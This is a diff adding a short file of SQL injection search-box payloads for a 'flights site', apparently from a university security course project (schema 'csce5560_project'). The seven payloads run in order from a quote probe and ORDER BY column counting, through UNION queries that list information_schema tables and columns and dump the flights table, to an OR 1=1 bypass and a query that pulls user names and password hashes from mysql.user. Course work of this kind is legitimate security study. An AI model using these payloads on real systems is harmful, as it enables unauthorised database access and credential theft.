@@ -1,0 +1,9 @@
+SQL Injection Search Queries for flights site
+
+1) "
+2) " ORDER BY 10 #
+3) " UNION (select TABLE_NAME,TABLE_SCHEMA,3,4,5,6,7,8,9 from information_schema.tables) #
+4) " UNION SELECT * FROM FLIGHTS #
+5) " OR 1=1 #
+6) " UNION (SELECT COLUMN_NAME,2,3,4,5,6,7,8,9 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='csce5560_project' AND TABLE_NAME='flights') #
+7) " UNION select user, password, host,4,5,6,7,8,9 from mysql.user #
